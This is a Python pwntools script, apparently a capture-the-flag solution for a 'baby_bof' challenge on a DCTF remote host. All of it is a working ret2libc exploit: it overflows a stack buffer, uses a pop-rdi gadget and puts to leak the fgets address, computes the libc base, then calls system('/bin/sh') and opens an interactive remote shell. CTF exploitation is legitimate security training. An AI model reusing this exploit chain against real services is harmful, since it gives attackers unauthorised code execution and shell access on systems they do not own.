from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

context.terminal = ['st', '-e', 'bash', '-c']
context.binary = "./baby_bof"

#p = gdb.debug('./baby_bof', '''
#             break vuln
#             continue''')
#p = process("./baby_bof")
p = remote('dctf-chall-baby-bof.westeurope.azurecontainer.io', 7481)

fgets_offset = 0x0857b0
str_bin_sh_offset = 0x1b75aa
system_offset = 0x055410

poprdi = p64(0x400683)
puts_plt = p64(0x4004a0)
fgets_got = p64(0x601028)
vuln = p64(0x4005b8)

payload = (b'\x41'*18) + poprdi + fgets_got + puts_plt + vuln
p.sendline(payload)

p.recvuntil('work\n')

base = bytearray(p.recvline()[:-2])
base.reverse()
# for some reason the first byte isn't returned, lets just add it here
base = bytes_to_long(bytearray(b'\x7f') + base) - fgets_offset 

p.recvline()

str_bin_sh = p64(base + str_bin_sh_offset)
system = p64(base + system_offset)

payload = (b'\x41'*18) + poprdi + str_bin_sh + system

p.sendline(payload)
p.recvline()
p.interactive()
